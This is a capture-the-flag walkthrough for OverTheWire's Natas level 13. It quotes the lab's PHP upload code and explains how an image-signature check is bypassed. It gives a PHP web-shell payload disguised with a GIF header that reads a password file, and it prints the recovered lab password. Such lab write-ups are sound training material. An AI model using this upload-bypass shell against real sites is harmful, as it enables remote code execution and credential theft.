`Link` : `https://overthewire.org/wargames/natas/natas13.html`

## [𝐖𝐚𝐥𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟐 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟑
## 𝐆𝐢𝐯𝐞𝐧

- Username: natas13
- URL:      `http://natas13.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:    `http://natas13.natas.labs.overthewire.org`
- `view pagesource`

```
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

- Notice: `} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {`
- Let's check what `exif_imagetype` means
```
exif_imagetype() reads the first bytes of an image and checks its signature.

Source: https://www.php.net/manual/en/function.exif-imagetype.php
```

- Means, if we can manipulate our payload in a way which contains image signature at the beginning & payload at the end, we will be able to exploit it.

```
GIF89a;

<?php
	// #1 echo "php upload possible!" 
	// #2 system('find / -name natas13')
	// #3 exploit
	system('cat /etc/natas_webpass/natas14')
?>
```

- Upload the payload, change extension to php & boom! solved

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/149267813-d44a9b57-7264-49c0-adfa-65651c21b435.png width=600px>
</div>

- `GIF89a; Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 `
